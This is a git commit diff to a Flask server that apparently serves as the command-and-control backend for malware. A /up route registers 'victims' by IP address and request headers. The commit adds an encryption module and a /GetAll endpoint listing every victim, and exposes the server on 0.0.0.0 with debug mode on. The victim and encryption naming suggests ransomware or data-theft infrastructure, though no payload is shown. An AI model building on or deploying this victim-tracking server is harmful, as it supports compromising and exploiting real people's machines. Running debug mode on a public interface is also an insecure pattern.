01489910d12cace12fb66eeb94f1175d4db61e79
yahya <yahyaoulha0@gmail.com>
2024-07-06 22:39:20 +0100

    added GetAll route for getting all victims

--- api/run.py
+++ api/run.py
@@ -1,10 +1,13 @@
-from flask import Flask, request
-from models.victim import Victim
+from flask import Flask, request, jsonify
+from api.models.victim import Victim
+from api.models.encryption import Encryption
 
 
 app = Flask(__name__)
 
-@app.route('/up', methods=['POST'])
+crypt = Encryption()
+
+@app.route("/up", methods=["POST"])
 def up():
     CurrentVictim = Victim(request.remote_addr)
     NameHeader = request.headers.get("name")
@@ -16,5 +19,18 @@ def up():
 
     return '', 200
 
+
+@app.route("/GetAll", methods=["GET"])
+def GetAll():
+    """
+    Get all victims
+
+    return:
+        List[dict] = list of dicts each contains information about victim's info
+    """
+
+    return jsonify(Victim(None).AllVictims)
+
+
 if __name__ == '__main__':
-    app.run(host="127.0.0.1", port=1133, debug=True)
+    app.run(host="0.0.0.0", port=1133, debug=True)
